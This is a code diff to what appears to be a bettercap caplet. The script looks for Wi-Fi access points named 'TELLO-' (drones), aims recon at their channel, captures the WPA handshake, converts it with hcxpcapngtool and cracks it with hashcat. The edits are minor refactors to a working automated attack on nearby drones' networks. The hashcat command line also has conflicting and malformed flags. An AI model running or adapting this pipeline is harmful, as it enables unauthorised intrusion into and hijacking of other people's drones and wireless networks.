@@ -47,7 +47,8 @@ onEvent('mod.started', function(event){
 onEvent('wifi.ap.new', function(event){
     var ap = event.data;
     log('📡 Access point detected: ' + ap.hostname + ' @ ' + ap.mac + ' (' + ap.vendor + ')');
-    log_debug(JSON.stringify(ap));
+    log_debug('JSON object: ' + JSON.stringify(ap));
+
     if(ap.hostname.startsWith('TELLO-')){
         log('🚁 Drone identified, homing in on channel ' + ap.channel);
         run('wifi.recon.channel ' + ap.channel);
@@ -82,16 +83,18 @@ onEvent('wifi.client.handshake', function(event){
         log('📝 Target handshake data aquired, stopping wifi recon');
         run('wifi.recon off'); // Stop wifi recon 
 
+        var cmd;
+
         log('🪄 Converting packets to 22000 format');
-        var cmd = hcxpcapngtool +
+        cmd = hcxpcapngtool +
             ' -o ' + hashcatFormat22000FileName +
-            //TODO: filter on ap mac address +
+            ' -all' + //TODO: filter on ap mac address
             ' ' + handshakesFileName;
         log_debug('Command: ' + cmd);
         run('!'+cmd);
 
         log('🪅 Cracking hashes, stand by...');
-        var cmd = 'cd ' + hashcatHomePath +
+        cmd = 'cd ' + hashcatHomePath +
             ' && ' + hashcat +
             ' -m 3 -a 3 -m 22000 -w' + wordlistFileName +
             ' -o ' + hashcatOutputFileName +
